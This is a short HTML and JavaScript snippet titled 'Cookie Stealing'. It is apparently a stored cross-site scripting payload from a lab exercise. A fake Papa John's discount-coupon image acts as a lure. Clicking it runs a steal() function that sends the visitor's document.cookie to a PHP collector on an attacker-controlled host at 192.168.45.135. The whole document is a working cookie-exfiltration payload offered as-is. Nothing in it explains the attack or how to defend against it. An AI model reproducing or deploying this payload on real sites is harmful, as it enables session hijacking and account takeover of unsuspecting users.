--->> Cookie Stealing 


<a href="javascript:steal()"><img src="https://professionalsaver.files.wordpress.com/2012/06/papa-johns-50-off1.png" width="250" height="200"/></a>
<script>

function steal(){

	window.open("http://192.168.45.135/papaJohn/usercookie.php?cookie=" %2B document.cookie,"_blank");
}
</script>

